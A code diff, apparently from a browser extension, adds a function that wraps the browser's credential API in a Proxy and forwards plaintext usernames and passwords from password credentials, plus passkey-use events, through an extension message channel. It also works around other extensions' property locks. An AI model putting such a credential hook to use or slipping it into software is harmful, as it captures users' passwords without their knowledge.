@@ -278,3 +278,81 @@ class PasswordCheck {
         }
     }
 }
+
+function patchNavigatorCredentials(encryptionKey) {
+    const orig = window.navigator.credentials
+    if (!orig) return
+
+    const proxy = new Proxy(orig, {
+        // Absorb configurable:false locks from other extensions (e.g. 1Password)
+        // onto the underlying target — the get trap still fires regardless
+        defineProperty(target, prop, descriptor) {
+            return Reflect.defineProperty(target, prop, descriptor)
+        },
+
+        get(target, prop, receiver) {
+            try {
+                const val = Reflect.get(target, prop, receiver)
+
+                if (prop === 'create' && typeof val === 'function') {
+                    return async function(options) {
+                        // WebAuthn call is outside the observation try/catch:
+                        // our monitoring must never prevent the credential flow
+                        const credentials = await val.apply(target, arguments)
+                        try {
+                            if (options?.publicKey) {
+                                await SecureMessage.sendMessage("account-usage", { subtype: "public-key" }, encryptionKey)
+                            }
+                        } catch (error) {
+                            console.error("error intercepting credentials.create", error)
+                        }
+                        return credentials
+                    }
+                }
+
+                if (prop === 'get' && typeof val === 'function') {
+                    return async function(options) {
+                        const credentials = await val.apply(target, arguments)
+
+                        try {
+                            if (options?.password) {
+                                if (credentials?.type === "password" && credentials.id && credentials.password) {
+                                    await SecureMessage.sendMessage(
+                                        "AccountUsage",
+                                        { subtype: "password", username: credentials.id, password: credentials.password },
+                                        encryptionKey,
+                                    )
+                                }
+                            } else if (options?.publicKey) {
+                                await SecureMessage.sendMessage("account-usage", { subtype: "public-key" }, encryptionKey)
+                            }
+                        } catch (error) {
+                            console.error("error intercepting credentials.get", error)
+                        }
+                        return credentials
+                    }
+                }
+
+                return val
+            } catch (_) {
+                // Trap machinery failed — fall through transparently
+                return Reflect.get(target, prop, receiver)
+            }
+        },
+    })
+
+    try {
+        Object.defineProperty(window.navigator, 'credentials', {
+            get: () => proxy,
+            configurable: true,
+            enumerable: true,
+        });
+    } catch (_) {
+        // navigator own-property is not configurable — patch the prototype instead
+        const proto = Object.getPrototypeOf(window.navigator);
+        const desc = Object.getOwnPropertyDescriptor(proto, 'credentials');
+        if (desc?.configurable) {
+            Object.defineProperty(proto, 'credentials', { ...desc, get: () => proxy });
+        }
+    }
+}
